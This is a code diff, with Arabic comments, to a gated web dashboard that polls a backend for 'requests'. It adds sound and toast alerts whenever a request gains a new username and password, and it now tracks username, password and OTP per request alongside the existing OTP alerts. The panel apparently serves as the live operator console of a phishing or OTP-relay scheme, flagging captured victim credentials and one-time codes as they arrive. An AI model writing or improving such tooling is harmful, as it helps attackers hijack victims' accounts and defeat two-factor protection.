@@ -532,6 +532,12 @@
         gateError.classList.remove('show');
         gate.style.display = 'none';
         dash.classList.add('show');
+        try{
+          if (window.AudioContext || window.webkitAudioContext) {
+            notificationAudioContext = notificationAudioContext || new (window.AudioContext || window.webkitAudioContext)();
+            notificationAudioContext.resume();
+          }
+        }catch(err){ /* audio not available, ignore */ }
         startPolling();
       } else {
         gateError.classList.add('show');
@@ -551,9 +557,12 @@
     });
 
     // ---- Notification sound (Web Audio API beep, no file needed) ----
+    var notificationAudioContext = null;
     function playNotifySound(){
       try{
-        var ctx = new (window.AudioContext || window.webkitAudioContext)();
+        var ctx = notificationAudioContext || new (window.AudioContext || window.webkitAudioContext)();
+        notificationAudioContext = ctx;
+        if (ctx.state === 'suspended') ctx.resume();
         var osc = ctx.createOscillator();
         var gain = ctx.createGain();
         osc.connect(gain);
@@ -585,7 +594,7 @@
     // بيانات حقيقية من السيرفر الخلفي (server.js) - من غير أي محاكاة
     // ================================================================
     var latestRequests = [];      // آخر نسخة من الطلبات جاية من /api/requests
-    var previousById = {};        // لمقارنة الحالة القديمة واكتشاف الجديد/تغيّر الـ OTP
+    var previousById = {};        // لمقارنة الحالة القديمة واكتشاف الجديد/تغيّر بيانات الدخول أو OTP
     var currentRequestId = null;  // الطلب المفتوح حاليًا في نافذة التفاصيل
     var pollTimer = null;
 
@@ -629,6 +638,10 @@
           // طلب جديد لم يكن موجودًا في آخر استعلام
           playNotifySound();
           showToast('طلب جديد وصل: ' + (r.username || '-'));
+        } else if ((r.username && r.username !== prev.username) || (r.password && r.password !== prev.password)) {
+          // بيانات اسم المستخدم وكلمة المرور وصلت إلى طلب موجود
+          playNotifySound();
+          showToast('وصل اسم المستخدم وكلمة المرور');
         } else if (r.otp && r.otp !== prev.otp) {
           // نفس الطلب لكن وصل له OTP جديد
           playNotifySound();
@@ -636,7 +649,14 @@
         }
       });
       var map = {};
-      newList.forEach(function(r){ map[r.id] = { status: r.status, otp: r.otp }; });
+      newList.forEach(function(r){
+        map[r.id] = {
+          status: r.status,
+          username: r.username,
+          password: r.password,
+          otp: r.otp
+        };
+      });
       previousById = map;
     }
 
